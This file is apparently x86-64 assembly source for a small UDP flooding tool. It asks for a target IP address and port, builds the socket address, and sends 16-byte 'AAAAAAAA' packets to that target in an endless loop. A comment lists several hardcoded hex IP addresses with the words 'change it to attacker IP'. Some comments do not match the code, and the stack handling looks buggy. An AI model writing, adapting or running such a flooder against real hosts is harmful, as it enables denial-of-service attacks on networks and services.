;arg x86_64        rdi   rsi   rdx   r10   r8    r9    -

section	.text
    	global _start

_start:
	jmp main


write:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 1   ; use the write syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

read:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 0   ; use the read syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

ipaddress:
	enter 0, 0
	;push rbp
	;mov rbp, rsp

	mov r14, [rbp+16]
	dec r14
	xor rcx, rcx
	xor rbx, rbx
	xor rax, rax
	xor r13, r13
	mov r8, 1
	xor r9, r9
	mov r12, [rbp+24]
	mov r15, [rbp+24]

fp:
	cmp byte[r15 + rax], '.'
	je ip
	inc rbx
	inc rax
	jmp fp

rawip3:
	mov r10b, byte[r12]
	sub r10, 0x30
	imul r10, r10, 100
	add r9, r10
	inc r12
rawip2:
	mov r10b, byte[r12]
	sub r10, 0x30
	imul r10, r10, 10
	add r9, r10
	inc r12
rawip1:
	mov r10b, byte[r12]
	sub r10, 0x30
	add r9, r10
	add r12, 2

	cmp r8, 1
	je storraw1
	cmp r8, 2
	je storraw2
	cmp r8, 3
	je storraw3
	cmp r8, 4
	je storraw4
	
storraw1:
	or r13, r9
	jmp ip2
storraw2:
	shl r9, 8
	or r13, r9
	jmp ip2
storraw3:
	shl r9, 16
	or r13, r9
	jmp ip2
storraw4:
	shl r9, 24
	or r13, r9	
	jmp ip2

ip:
	xor r10, r10
	xor r9, r9
	cmp rbx, 3
	je rawip3
	cmp rbx, 2
	je rawip2
	cmp rbx, 1
	je rawip1

ip2:

	inc rbx
	add rcx, rbx
	xor rbx, rbx
	inc rax
	inc r8
	
	cmp r14, rcx  
	jg fp

	mov rax, r13
	
	leave
	;mov rsp, rbp
	;pop rbp
	ret

;-----------port ------------
port:
	enter 0, 0
	;push rbp
	;mov rbp, rsp

	mov r14, [rbp+16]
	dec r14
	xor rcx, rcx
	xor rbx, rbx
	xor rax, rax
	xor r13, r13
	xor r11, r11
	mov r8, 1
	xor r9, r9
	xor r10, r10
	mov r12, [rbp+24]


pip:
	
	cmp r14, 5
	je prawip5
	cmp r14, 4
	je prawip4
	cmp r14, 3
	je prawip3
	cmp r14, 2
	je prawip2
	cmp r14, 1
	je prawip1

prawip5:
	mov r10b, byte[r12]
	sub r10b, 0x30
	imul r10, r10, 10000
	add r9, r10
	inc r12

prawip4:
	xor r10, r10
	mov r10b, byte[r12]
	sub r10b, 0x30
	imul r10, r10, 1000
	add r9, r10
	inc r12

prawip3:
	xor r10, r10
	mov r10b, byte[r12]
	sub r10b, 0x30
	imul r10, r10, 100
	add r9, r10
	inc r12
prawip2:
	xor r10, r10
	mov r10b, byte[r12]
	sub r10b, 0x30
	imul r10, r10, 10
	add r9, r10
	inc r12
prawip1:
	xor r10, r10
	mov r10b, byte[r12]
	sub r10b, 0x30
	add r9, r10
	add r12, 2

pstorraw1:
	mov r13b, r9b
	shl r13, 8
	shr r9, 8
	mov r11b, r9b
	xor r9, r9
	add r9, r13
	add r9, r11


pip2:

	mov rax, r9
	
	leave
	;mov rsp, rbp
	;pop rbp
	ret


open:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 2   ; open syscall
	mov rdi, [rbp+24]   ; file desc
	mov rsi, [rbp+16] ; code
	mov rdx, 0  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

socket:
	enter 0, 0
	mov rdx, 17  ;udp
	mov rsi, 2   ;SOCK_DGRAM
	mov rdi, 2   ;AF_INET
	mov rax, 41
	syscall
	leave
	ret

sendto:
	enter 0, 0
	;struct sockaddr_in 16 bytes
	;sin_family 2 bytes
	;sin_port 2 bytes
	;sin_addr 4 bytes

	xor rax,rax
		
	mov rdi, [rbp+16]
	mov rsi, [rbp+24]
	mov rdx, [rbp+32]
	xor r10, r10

	push rax
	push rax
	push rax

	mov r14, [rbp+40]
	mov r15, [rbp+48]

	mov [rsp],byte 2
	mov [rsp+2], r15w ;word 0x3500 ;0x8813 
	mov [rsp+4], r14d ;dword 0x16c9f6b6 ;0x15f9be6d ;0x0101a8c0 ;0x454162c2  ;0x8fbe6e5d ;0x92bc0a4c ;0x0f01a8c0 ;change it to attacker IP
	
	mov r8, rsp
	mov r9, 16
	
	mov rax, 44
	syscall
	leave
	ret

sendloop:
	enter 0, 0
	;push rbp
	;mov rbp, rsp

	xor rbx, rbx
	push rbx
	mov rsi, 'AAAAAAAA'
	push rsi
	mov rsi, rsp
	xor rdx,rdx
	add rdx,16
	push rdx

	mov r10, [rbp + 32]
	mov r11, [rbp + 24]
	mov r12, [rbp + 16]

	push r12
	push r11
	push rdx
	push rsi
	push r10
	call sendto
	

 
	leave
	;mov rsp, rbp
	;pop rbp
	ret

exit:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 60  ; exit syscall
	mov rdi, [rbp+16]   ; 1
	xor rsi, rsi
	xor rdx, rdx  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

main:

	


	push r11
	push r10
	call socket
	;mov r12, rax
	push rax
	;mov r12, rsp
		
	cmp rax, 0
	jl error
	push word 0x0A0D
	mov rsi, 's       '
	push rsi
	mov rsi, 'n Succes'
	push rsi
	mov rsi, 'Operatio'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,26
	push rdx
	call write
	;jmp end

	add rsp, 42

	;xor rcx, rcx

	push word 0x0A0D
	mov rsi, ' :      '
	push rsi
	mov rsi, ' Address'
	push rsi
	mov rsi, 'Enter IP'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,26
	push rdx
	call write

	add rsp, 42


	xor rsi, rsi
	push rsi
	push rsi
	push rsi ; reserve 24 bytes
	push rsp
	mov r15, [rsp]
	xor rdx,rdx
	add rdx, 17
	push rdx
	call read
	mov byte[r15 + rax - 1], '.'
	
	;add rsp, 40

	push r15
	push rax
	call ipaddress
	;mov r14, rax
	add rsp, 56
	push rax
	;mov r14, rsp

	

	push word 0x0A0D
	mov rsi, ' port : '
	push rsi
	mov rsi, ' Address'
	push rsi
	mov rsi, 'Enter IP'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,26
	push rdx
	call write

	add rsp, 42


	xor rsi, rsi
	push rsi
	push rsi
	push rsi ; reserve 24 bytes
	push rsp
	mov r15, [rsp]
	xor rdx,rdx
	add rdx, 17
	push rdx
	call read
	mov byte[r15 + rax - 1], '.'

	;add rsp, 40

	push r15
	push rax
	call port
	;mov r13, rax
	add rsp, 56
	push rax
	;mov r13, rsp

	
	;push qword [r13]
	;push qword [r14]
	;push qword [r12]

loopmain:
	call sendloop
	
	jmp loopmain

	jmp end

error:
	push word 0x0A0D
	mov rsi, 'n ERROR '
	push rsi
	mov rsi, 'Operatio'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,18
	push rdx
	call write

end:


	push 1
	call exit












